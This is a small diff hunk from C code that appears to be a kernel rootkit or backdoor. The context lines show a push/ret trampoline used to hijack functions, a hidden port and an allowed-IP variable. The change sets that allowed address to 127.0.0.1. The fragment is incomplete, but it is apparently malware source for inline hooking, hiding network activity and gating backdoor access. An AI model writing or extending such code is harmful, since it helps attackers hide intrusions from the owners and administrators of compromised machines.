@@ -32,7 +32,7 @@ static char lookup_code[HIJACK_LEN];
 static char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
 static unsigned int *p_addr = (unsigned int*) (hjc+1);
 
-static char * allowed_ip_str = "000.000.000.000";
+static char * allowed_ip_str = "127.000.000.001";
 static unsigned short hidden_port = 0;
 static unsigned int allowed_ip = 0;
 
